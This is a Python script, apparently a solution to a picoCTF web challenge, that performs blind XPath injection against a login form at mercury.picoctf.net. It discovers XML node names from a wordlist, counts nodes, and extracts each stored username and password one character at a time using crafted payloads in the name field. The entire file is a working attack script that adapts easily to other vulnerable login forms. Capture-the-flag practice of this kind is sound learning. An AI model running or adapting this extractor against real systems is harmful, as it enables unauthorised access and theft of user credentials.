import sys
import requests
import re

# https://rhinosecuritylabs.com/penetration-testing/xpath-injection-attack-defense-techniques/
# https://dl.packetstormsecurity.net/papers/bypass/Blind_XPath_Injection_20040518.pdf
# https://www.scip.ch/en/?labs.20180802

def validate(name, password):
  res = requests.post(
    "http://mercury.picoctf.net:7029/",
    headers={
      "Host": "mercury.picoctf.net:7029",
      "Connection": "keep-alive",
      # "Content-Length": str(content_length),
      "Content-Type": "application/x-www-form-urlencoded",
    },
    data={
      'name': name,
      'pass': password
    }
  )
  if ('500 Internal' not in res.text):
    result = re.search(r'> --> (.*)', res.text)
    # > -->(.*)$
    # print(res.text)
    if (result != None and result.group(1) != 'Login failure.'):
      # print(name)
      # print(result.group(1))
      return True
  return False


# //user[name/text()='a' or 'hello'=substring((//user[position()=1]/child::node()[position()=1]), 1) or 'a'='b' and pass/text()='adsf']

# substring((//user[position()=1]/child::node()[position()=1]), 1)='hello'

# //user[position()=1]/child::*[position()=1]='hello'

# string-length(//user[position()=1]/child::*[position()=1])=5

# substring(//user[position()=1]/child::*[position()=1],1,1)=''

def find_nodes():
  with open('common.txt', 'r') as file:
    common = [line.split('\n')[0] for line in file.readlines()]


  nodes = []
  for word in common:
    name = f"' or {len(word)}=string-length(name(//{word})) or 'a'='b"
    password = "hi"
    if (validate(name, password)):
      nodes.append(word)

  print(nodes)


def count_children(nodes):
  for node in nodes:
    for i in range(100):
      name = f"' or {i}=count(//{node}) or 'a'='b"
      password = "hi"
      if (validate(name, password)):
        print(node, ':', i)
        break


def getCombos():
  chars = [chr(i) for i in range(33, 127)]
  chars.remove("'")
  #3 users
  for i in range(3):
    for sub_node in range(2):
      str_len = 0
      word = ""
      #find length of string
      for l in range(100):
        name = f"' or string-length(//user[position()={i+1}]/child::*[position()={sub_node+1}])={l} or 'a'='b"
        password = "asdf"
        if (validate(name, password)):
          str_len = l
          print(name)
          break

      #test each character
      for char_i in range(str_len):
        for char in chars:
          name = f"' or substring(//user[position()={i+1}]/child::*[position()={sub_node+1}],{char_i+1},1)='{char}' or 'a'='b"
          # print(name)
          password = "hi"
          if (validate(name, password)):
            print(char)
            word += char
            break
      print(i+1, 'user: child', sub_node+1, '    ', word)

# ran each function seperately
# find_nodes()
# count_children(['author', 'db', 'name', 'pass', 'text', 'title', 'user', 'users'])
# getCombos()